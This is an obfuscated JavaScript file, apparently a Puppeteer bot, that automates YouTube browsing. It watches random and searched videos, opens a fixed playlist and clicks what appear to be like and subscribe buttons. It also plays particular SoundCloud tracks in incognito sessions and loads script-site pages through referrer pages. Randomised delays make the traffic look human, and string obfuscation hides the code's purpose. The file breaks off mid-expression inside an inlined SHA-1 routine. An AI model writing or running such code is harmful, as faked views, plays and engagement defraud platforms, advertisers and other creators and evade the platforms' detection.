const Y = d,
  X = b,
  W = c;

function a() {
  const bn = [
    'headers',
    'i2j1DhrVBIa+ia',
    'DgvYDMLLDW',
    'W4yPWRldSmkAyuRdKcPI',
    'y2f0y2G',
    'zxrOAwnZlw9Mlq',
    'y2XLyxi',
    'WROVW6bBemoTEqupWP4',
    'pts/456851',
    'm3BAhe1wsl',
    'OE19r7MIMW',
    'zxzHBhvHDgu',
    'zwrIywnRlxnOyq',
    'oX/cLmow',
    'WPm3lYNcH8oFffi1Bq',
    'https://gr',
    'rg/en/scri',
    'WQ7cKsGxeSoNd8oPmvW',
    'to/IMDb_My',
    'BxvSys9cExbHCW',
    'WQdcUSk+WPDLWOFcRSofcfm',
    'vNz8W5pdObiUW4uQwG',
    'oE8vC0QEWU',
    'W7JcPG9tWOSVgNZdPuO',
    'lwfKyMXVy2STDG',
    'W5SaWQZdMCohsM/cJCkpW7G'
  ];
  a = function() {
    return bn;
  };
  return a();
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x16b7 + 0x20a1 + -0x3758);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x1 * -0x17a6 + -0x5 * 0x11a + 0x1d29))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x152d + -0x26e + 0x1 * -0x12bf), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xc25c + -0xc280 + -0x8b * -0x3a4 + (0x3d * 0x17f + 0x4 * 0x67f + -0x3aa7) * random()) : await standardWaitForNetIdle(f), await wait(0xaaf * 0x1 + -0x80f + -0x8 * -0x21d + (0x11d0 + -0x1 * -0x45c7 + -0x3 * 0x102d) * random()), 0x1 * 0x7b9 + -0x1933 * 0x1 + 0x37f * 0x5;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x16b7 + 0x20a1 + -0x3758);
    let h = e[f];
    if (b['HrkQBB'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1dd * 0x6 + -0xa27 + -0x107, s, t, u = 0x2504 + -0x124b + -0x12b9; t = n['charAt'](u++); ~t && (s = r % (-0x1eb4 + 0x995 + 0x1 * 0x1523) ? s * (0x1ffc + -0x3 * 0x339 + -0x1611) + t : t, r++ % (-0x9a5 * 0x2 + 0x1fb0 + -0xc62)) ? p += String['fromCharCode'](-0xa3e + 0x2 * 0xd15 + 0x1 * -0xeed & s >> (-(0x22dc + -0x2 * -0x7ca + 0x1937 * -0x2) * r & -0x241b + 0x142f * 0x1 + 0xff2)) : -0x1 * -0xb6b + -0x281 * 0x3 + 0x5 * -0xc8) {
          t = o['indexOf'](t);
        }
        for (let v = 0x54a * 0x3 + 0xd4 * -0x29 + 0xa * 0x1cf, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x5e6 + 0x5d + -0x633))['slice'](-(0x2cf * -0x6 + 0x463 * -0x1 + 0x7 * 0x309));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x665 + 0x67 * 0x4c + 0x97 * -0x29,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x142 * -0x2 + 0x5b9 * -0x5 + 0x1a19; u < -0x185 * 0x17 + 0x4c7 + -0x2a * -0xbe; u++) {
          p[u] = u;
        }
        for (u = 0x1 * 0x9a9 + -0x4d * -0x6f + 0x13 * -0x244; u < 0x1bfe + -0x203 * 0x1 + -0x18fb; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1e6b + -0x1 * 0x3ca + -0x19a1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xca9 + -0x1d88 + 0x607 * 0x7, q = 0x1 * -0x214a + 0x2524 * 0x1 + 0x22 * -0x1d;
        for (let v = 0x4 * -0x15c + 0x1 * -0x11ef + 0x1f * 0xc1; v < n['length']; v++) {
          u = (u + (-0x1bc9 + 0x2 * -0x59 + 0x1c7c * 0x1)) % (0x8e1 + -0x40 * -0x2c + -0x12e1), q = (q + p[u]) % (0x1080 + -0x18a2 + -0x922 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2b6 * 0x5 + 0x37 + 0x1 * 0xe57)]);
        }
        return t;
      };
      b['KcyOJt'] = m, c = arguments, b['HrkQBB'] = !![];
    }
    const j = e[-0x104e * -0x2 + -0x3c4 + -0x1cd8],
      k = f + j,
      l = c[k];
    return !l ? (b['YqsIbg'] === undefined && (b['YqsIbg'] = !![]), h = b['KcyOJt'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function standardWaitForNetIdle(f) {
  return await wait(0x3f * 0x67 + 0x1 * 0x1a15 + 0x1 * -0x1fe6), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1fe3 + -0x38d + 0xd3 * 0x2b;
}
async function randomWait() {
  return await wait(0x2 * 0x476 + 0x1dd6 + -0x99d * 0x2 + (0x6bb * 0x1 + -0x7a * -0x2f + -0x15f * 0x7) * random()), 0x177c + 0x1e4e + 0x31 * -0x119;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1f * 0xa3 + 0x3cf * -0x7 + 0x2 * 0x1733, 0x1 * 0x1cab + -0x2 * 0x92d + -0xa4a), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x10d76 + -0x1 * 0x18fbc + 0x16ca6) * getRandomInt(0xbcc + -0x3c6 + -0x804, 0x1bf * -0x4 + -0x2610 + 0x2d11 * 0x1), h)), 0x142 * 0x7 + -0x3 * -0x5a + -0x9db;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * 0x1f49 + 0x6 * 0x141 + -0x26cf;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x2 * -0x59 + 0xc9d * -0x1 + 0x8 * 0x1aa]['split']('\x20');
    for (let k = -0x1367 + 0x58a + -0xa9 * -0x15; k < i['length']; k += -0x896 * 0x1 + -0x1b29 + 0x51 * 0x71)
      j += i[k] * h[i[k + (0x4 * -0x740 + -0x1 * 0xe75 + -0x2b76 * -0x1)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1eb8 + -0x12c * 0x1 + 0x1fea)['map'](l => Array['from'](l['children']))['flat'](-0x18c5 + -0x285 * 0x5 + 0x255f)['map'](l => l['childNodes'][-0x2b7 * 0x5 + -0x261a + 0x15 * 0x276]['childNodes'][0x1b25 * 0x1 + -0x1cd9 + 0x2 * 0xda]['childNodes'][-0x29 * 0x25 + 0x9 * 0xfb + -0x2e5]['childNodes'][0x25 * 0x79 + -0x1 * 0x38f + -0xdee]['childNodes'][0x1 * -0x4e9 + -0x1b96 + 0x2080]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1acb + 0x1149 + -0x282c, -0x42e + 0xf4d * 0x2 + -0x6e4)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1829 * 0x4 + -0x1 * -0x4336 + 0x5806);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1 * -0xf8ed + 0x4fdb * 0x1 + 0x1f78 * -0x3) * getRandomInt(0x5b1 + 0x1f13 + -0x24c2, 0x1e79 + 0x878 * -0x1 + -0x15fc), h);
  return await wait(i), 0x1 * -0x1cc1 + -0xc09 + 0xd99 * 0x3;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x16b7 + 0x20a1 + -0x3758);
    let h = e[f];
    if (c['eCdMFd'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1dd * 0x6 + -0xa27 + -0x107, r, s, t = 0x2504 + -0x124b + -0x12b9; s = m['charAt'](t++); ~s && (r = q % (-0x1eb4 + 0x995 + 0x1 * 0x1523) ? r * (0x1ffc + -0x3 * 0x339 + -0x1611) + s : s, q++ % (-0x9a5 * 0x2 + 0x1fb0 + -0xc62)) ? o += String['fromCharCode'](-0xa3e + 0x2 * 0xd15 + 0x1 * -0xeed & r >> (-(0x22dc + -0x2 * -0x7ca + 0x1937 * -0x2) * q & -0x241b + 0x142f * 0x1 + 0xff2)) : -0x1 * -0xb6b + -0x281 * 0x3 + 0x5 * -0xc8) {
          s = n['indexOf'](s);
        }
        for (let u = 0x54a * 0x3 + 0xd4 * -0x29 + 0xa * 0x1cf, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1 * 0x5e6 + 0x5d + -0x633))['slice'](-(0x2cf * -0x6 + 0x463 * -0x1 + 0x7 * 0x309));
        }
        return decodeURIComponent(p);
      };
      c['DBALJA'] = i, b = arguments, c['eCdMFd'] = !![];
    }
    const j = e[-0x665 + 0x67 * 0x4c + 0x97 * -0x29],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DBALJA'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x4c7 + 0x22be + -0x2785]['children'][-0x11d6 + 0x26 * 0xa3 + -0x2c * 0x25]['children'][-0x1 * -0x59e + -0x2100 + 0xa * 0x2bd]['children'][0xb5 + -0x1b1e + -0x1a69 * -0x1]['children'][-0xc43 * 0x1 + -0x1844 + 0x2487]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xb0c + 0x1cb1 * -0x1 + 0x11a6;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x91 * 0x2f + 0x1b * 0x75 + 0xeac + (-0x11ed + -0x221b + -0x7 * -0x776) * random()
  }), await wait(0x34 * 0x25 + 0x8f5 * -0x2 + -0xc5a * -0x1 + (-0x24f * -0xa + 0x1f6 * 0x9 + 0xd30 * -0x3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x22d2 + -0x1 * 0x16f7 + -0xbd9]['childNodes'][-0x7 * -0x199 + -0x1657 + -0xb29 * -0x1]['childNodes'][-0x21b7 + 0x1763 * 0x1 + 0x17 * 0x73]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1580 + -0x641 * -0x2 + -0x301 * -0x3]['childNodes'][-0xbc8 + -0xa * 0x355 + -0x2 * -0x168d]['childNodes'][0x3e9 * -0x3 + -0xd0 * -0x5 + 0x7ad]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xb * 0x1c9 + 0x1 * -0x1121 + -0x24c5 * -0x1),
          r = -0x3c * 0x4d + -0x6f3 * -0x1 + -0x3b3 * -0x3;
        for (let u = 0x1 * -0x140e + -0x1 * 0x1965 + 0x2d73; u < q['length']; u += 0x20d + 0x206 + -0x411)
          r += q[u] * k[q[u + (0x9b1 + 0x24ce + -0x1 * 0x2e7e)]];
        return r;
      }(n);
  });
  await wait((0x37eb + 0x4657 * -0x1 + 0x1241 * 0x4) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x13 * -0x153e + -0x10f1 * -0xe + -0x19668) * getRandomInt(-0x3d1 * -0x4 + 0x1 * 0xbd9 + -0x1b1c, 0x4 * -0x761 + -0xd83 + 0x31 * 0xe1), h + (0xb8 * -0x22 + 0xb3 * 0x23 + 0x1f * 0xa1));
  return await wait(i), -0x3 * -0x8d3 + -0x1186 + 0x8f2 * -0x1;
}
async function keyWatch(f) {
  const R = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * -0x36e + 0x1d08 + -0x3a * 0x71), log('clicking..' + '.'), await f['click'](R(0x1) + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + R(0xc) + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2143 + -0x2502 + 0x51fd + (-0x24f7 + -0x1 * -0x25f0 + 0x2ef) * Math['random']());
    });
  }, 0x2c71 + 0x1a71 + -0x2b8a);
  await wait(-0x2af4c + -0x3f9d * 0x1f + -0x1 * -0xef72f);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x5cbf * -0x3 + -0xf5f3 + 0xca16) * getRandomInt(-0x1cee * 0x1 + -0xa * 0xff + 0x26e8, -0x2 * -0x2fc + 0x23d1 + 0x170 * -0x1d)), clearInterval(h), -0x13f1 + 0x1861 + -0x1 * 0x46f;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x3eb + -0x58 * -0x36 + -0x167b;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x22be + -0x1a59 + -0x88 * -0x73;
    await randomWait();
  }
  return -0x184 * -0x10 + -0x1c54 + 0x13 * 0x37;
}

function fetchRandomSC() {
  const S = b;
  return Math['random']() <= -0xe9d + -0x1ea3 + 0x2d40 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xb47 * -0x3 + -0x51f * -0x2 + -0x7dd * -0x3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + S(0x7, '[pUk') + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1819 + -0x142a * 0x1 + -0x1 * 0x3ef + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x224d + 0x18 * -0x135 + 0x1c7 * -0x3;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k[T(0xb)](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * 0x12c3 + -0x3 * 0x4e79 + 0x5 * 0x55fe + getRandomInt(-0x2003 * 0x2 + 0x1 * -0x2861 + 0xa2ff, 0xe * -0xf2b + -0x7cf * -0x16 + 0x9dc0));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x11 * -0x78 + -0x946 + -0x43 * -0x5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1351 * -0x2 + -0x2ce * -0x7 + 0x1300;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x3 * -0x951 + 0x1 * -0x700 + -0x1 * 0x14f3, -0x228b * -0x1 + 0xfe * 0x4 + -0x2651)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1485 + 0x4a * 0x43 + 0x33 * -0xa1 + floor((0x4 * 0x7a3 + -0x1 * 0x10dd + 0x1 * -0x9c7) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E[U(0x14, 'gOnT') + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x2ba * 0x4bf92 + 0x604a5f32 + 0x12c34cba),
          0x1 * 0xb7f811 + -0xce1d64 + -0xc9 * -0xbf3b,
          0xdfd * 0x5 + -0xdb1f + 0x1152e,
          -0xd * -0x175 + 0x1c8d * -0x1 + 0xa1c
        ], y = [
          -0x39 * -0xa6 + 0x631 + -0x2b0f,
          -0x1967 + 0x1e7 * -0x5 + 0xb * 0x32e,
          0xe95 + 0x94 + 0xf21 * -0x1,
          0xcee + 0xde7 * -0x1 + -0xf9 * -0x1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x1e35 + -0x5b8 + 0x23ee)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x22eb + -0x11ec + 0x34d7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x6 * 0x50e + 0x78b + -0x25df) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x6af + -0xce5 + 0x636] = A[0x19 * -0xbb + 0x15e0 + -0x12f * 0x3] = A[0x157a + 0x19c * -0xe + 0x10f] = A[-0x2 * -0xaee + 0x1540 + -0x2b1a] = A[0x161d + 0x1c86 + -0x32a0] = A[0xfc5 + 0x12f3 * 0x2 + 0xcd * -0x43] = A[0x7 * 0x3ae + 0x1f87 * 0x1 + -0x3944] = A[0x56c + 0x9 * -0x2b1 + 0x3d * 0x4f] = A[0x354 * -0x7 + -0x1c99 * -0x1 + -0x6 * 0xe1] = A[0x75b + 0x2b * 0xad + -0x1 * 0x2462] = A[0x1b * -0x31 + -0xdf1 + 0x1325] = A[-0x16e6 + -0x3 * 0xa8a + 0x368e] = A[-0x1923 + 0x15da + -0x3 * -0x11c] = A[-0x1 * -0x1ab5 + 0x1309 + -0x2db2 * 0x1] = A[0x1c65 + 0x1aab * -0x1 + -0x1ad] = A[-0x82b + 0x2 * -0x697 + -0x1567 * -0x1] = A[-0x7 * 0x386 + 0x29 * 0xd3 + -0x912] = -0x2b * -0xc7 + -0x2 * -0x8fa + -0x3361, this['blocks'] = A) : this['blocks'] = [
                0x70f * 0x4 + -0x1535 + -0x707,
                -0x1 * 0x1841 + 0xbf5 * -0x1 + -0x5 * -0x73e,
                0x200e * 0x1 + 0xc41 * 0x1 + -0x2c4f,
                0x5ad * 0x2 + -0x1127 + -0x2d * -0x21,
                0x23ca + 0x76 + -0x1d0 * 0x14,
                -0xb92 + -0x145d + 0xf * 0x221,
                -0x25b5 + -0x34d * -0x9 + 0x800 * 0x1,
                0x2677 + 0x197d + -0x1 * 0x3ff4,
                -0x217d * -0x1 + -0x2 * -0x6da + 0x3 * -0xfbb,
                0x1c77 + -0x2527 + 0x2 * 0x458,
                -0x179e * 0x1 + -0xf45 + 0x5 * 0x7c7,
                -0x7 * -0x130 + -0x11 * -0x33 + -0xbb3,
                -0x8f + 0x3f8 + -0x1 * 0x369,
                0x12cf + -0xfb + -0x11d4,
                -0x53 * -0x65 + 0x877 + -0x2936,
                0xa * 0x37f + -0xa4c + -0x16 * 0x11f,
                0x2b8 * -0x1 + 0x4f9 * -0x3 + 0x285 * 0x7
              ], this['h0'] = 0xc995820d + -0x398e522 * 0xa + 0x6cc0a * -0x92c, this['h1'] = -0x122dca844 * -0x1 + 0x13735c6ac + 0x1 * -0x16a44c367, this['h2'] = 0x44b9bd0 + 0x1bb * -0x2c3e66 + 0x99 * 0x1787730, this['h3'] = 0x1fe3292 + 0x5b6f7e2 + 0x87d2a02, this['h4'] = -0x1 * 0x3956dbc3 + 0x1a7850d9 * 0x1 + 0xe2b16cda, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1860 + -0x1bf4 + 0xe5 * 0x4, this['finalized'] = this['hashed'] = -0x16f9 + 0x19c * 0x10 + -0x3 * 0xed, this['first'] = -0x3 * 0x6a1 + -0xeb6 + 0x229a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x28 * 0x1c + 0xd83 + -0x11e3, O = J['length'] || 0x1 * -0x1543 + 0x26c6 + 0x1183 * -0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1b6b + 0x17e * 0xb + 0x3ab * 0x3, P[-0x1a * 0x10f + -0x6b2 + 0x2238] = this['block'], P[-0x122d + -0xa63 + 0x1ca0] = P[0x1b62 + 0x188 + -0x1ce9] = P[-0xb7a * 0x1 + 0x50b + 0x1 * 0x671] = P[-0x4a * 0x4f + -0x130f + 0x29e8] = P[-0xd * -0x26f + -0x2365 + 0x7 * 0x8a] = P[-0x579 + 0x1288 + -0xd0a] = P[0x2b * -0x42 + -0x4cd + -0x1 * -0xfe9] = P[-0x1e5 * -0x12 + 0x21ea + 0x3b * -0x127] = P[-0x511 + 0xda3 * -0x2 + -0x1 * -0x205f] = P[0x1 * 0x147d + -0x67 * -0x1 + -0x14db] = P[0x1d2b + -0x52e + -0x1 * 0x17f3] = P[-0x1c6b * 0x1 + -0x2cc + -0x1f42 * -0x1] = P[-0x1 * -0x1d93 + -0x369 * 0x2 + -0x1 * 0x16b5] = P[-0x16 * 0x125 + 0x7 * 0x2bd + -0x184 * -0x4] = P[-0xf63 + 0x279 * -0x2 + 0x1463] = P[0x122 * 0x19 + 0x7 * -0x2bd + -0x308 * 0x3] = -0x65f + 0x2707 + -0x20a8), K) {
                    for (N = this['start']; M < O && N < 0x1b6e + -0x11f1 + -0x2b * 0x37; ++M)
                      P[N >> 0x1 * -0x98d + 0x2 * -0xd6b + 0x2465] |= J[M] << y[0x4 * 0x60c + 0xa1b + -0x2248 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xba * -0x15 + -0x1 * -0xf25 + -0xf9 * 0x1f; ++M)
                      (L = J['charCodeAt'](M)) < 0x1f * -0xb1 + 0x1 * -0x2196 + 0x3785 ? P[N >> 0x178 + 0x165c + -0x17d2] |= L << y[-0x867 + 0x16aa + -0xe40 & N++] : L < 0xc83 + -0x139 * 0x17 + -0x2 * -0xbce ? (P[N >> -0x1 * -0x57f + 0x1dc5 + -0x2342] |= (-0x235e * -0x1 + -0x2428 + 0x18a | L >> -0x1564 + 0x11 * -0x3d + 0x1977) << y[-0x31 * -0xc2 + 0x1d16 * -0x1 + -0x809 & N++], P[N >> -0xb3 * 0xf + 0x2416 + -0x1997 * 0x1] |= (-0x158e * 0x1 + 0x24cd + -0xebf | -0x17c5 + 0x2bb * -0xc + 0x38c8 & L) << y[-0x1c84 + -0x56e + -0x1 * -0x21f5 & N++]) : L < 0xb5 * -0x60 + 0x19d0c + -0x812c || L >= -0x37 * 0x44f + -0xd76 * 0x17 + 0x30293 ? (P[N >> 0x20f + -0x141e + -0x1211 * -0x1] |= (-0x2642 + 0x1 * -0xd67 + 0x3489 | L >> -0x4 * 0x503 + 0x1781 + -0x369) << y[-0x1207 + 0x1b31 * -0x1 + 0x2d3b & N++], P[N >> 0x34b * -0x7 + 0x153f + 0x1d0] |= (0xcad + 0xefb + -0x1b28 | L >> -0x3c * -0x77 + 0x26cb + -0xd55 * 0x5 & 0x1 * 0xec2 + 0x1500 + -0x2383) << y[0x789 * 0x5 + -0xf9f + 0x1b * -0xd1 & N++], P[N >> 0x10cd + -0xa9 * -0x4 + -0x136f * 0x1] |= (-0xe9 * -0x2 + 0xb7 * 0x29 + -0x1 * 0x1ea1 | -0x171c + -0x18e4 + -0x1 * -0x303f & L) << y[-0x1042 + -0x2 * -0x85 + 0xf3b & N++]) : (L = 0x16710 + -0x1cdd6 + -0x166c6 * -0x1 + ((0x67b + -0x92e + 0x6b2 & L) << -0xa * 